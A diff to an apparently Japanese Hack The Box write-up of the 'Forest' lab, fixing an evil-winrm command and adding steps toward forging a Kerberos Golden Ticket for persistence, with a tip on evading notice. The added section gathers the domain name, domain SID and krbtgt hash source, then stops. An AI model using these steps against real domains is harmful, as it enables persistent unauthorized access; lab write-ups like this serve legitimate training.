@@ -119,7 +119,7 @@ Status...........: Cracked
 ```
 
 ┌──(shoebill㉿shoebill)-[~/Forest_10.10.10.161]
-└─$ evil-winrm --ip 10.10.10.161 -u svc-alfresco -p s3rvice
+└─$ evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
 ...
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami
 htb\svc-alfresco
@@ -229,3 +229,60 @@ nt authority\system
 
 # 感想
 priv escのためにはそのユーザが属すグループ一つ一つについて「Reachable High Value Targets」等のenumを逐一すべきだ。
+
+# Golden Ticketを作る
+（ターゲットADへのアクセスを永続化のため）
+
+作成にあたり必要な情報は以下の通り：
+
+- ユーザ名
+- ドメイン名
+- ドメインSID
+- krbtgtのハッシュ
+
+(1) ユーザ名
+
+なんでもよい。今回はわかりやすくeviluserとする。（実際の攻撃では既存のユーザ名を使うべき。いきなり新規ユーザが作成されると怪しまれる）
+
+(2) ドメイン名
+
+```
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> . .\PoweView.ps1
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Get-Domain
+
+
+Forest                  : htb.local
+DomainControllers       : {FOREST.htb.local}
+Children                : {}
+DomainMode              : Unknown
+DomainModeLevel         : 7
+Parent                  :
+PdcRoleOwner            : FOREST.htb.local
+RidRoleOwner            : FOREST.htb.local
+InfrastructureRoleOwner : FOREST.htb.local
+Name                    : htb.local
+```
+ドメイン名はhtb.local。
+
+(3) ドメインSID
+
+現在のユーザのSIDを表示すると
+
+```
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami /user
+
+USER INFORMATION
+----------------
+
+User Name        SID
+================ =============================================
+htb\svc-alfresco S-1-5-21-3072663084-364016917-1341370565-1147
+```
+末尾の相対識別子（RID）1147を除いたS-1-5-21-3072663084-364016917-1341370565がドメインSID。
+
+(4) krbtgtのハッシュ
+
+これは`secretsdump.py`の出力にある。
+
+
+
